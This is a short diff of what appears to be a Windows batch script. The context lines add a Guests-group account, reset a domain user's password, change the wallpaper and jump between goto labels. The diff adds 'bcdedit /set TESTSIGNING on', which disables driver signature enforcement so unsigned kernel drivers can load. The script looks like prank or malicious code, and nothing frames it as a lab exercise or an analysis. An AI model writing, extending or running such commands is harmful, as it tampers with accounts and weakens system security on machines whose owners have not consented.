@@ -184,6 +184,7 @@ net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
 goto eeee
 :eeee
+bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
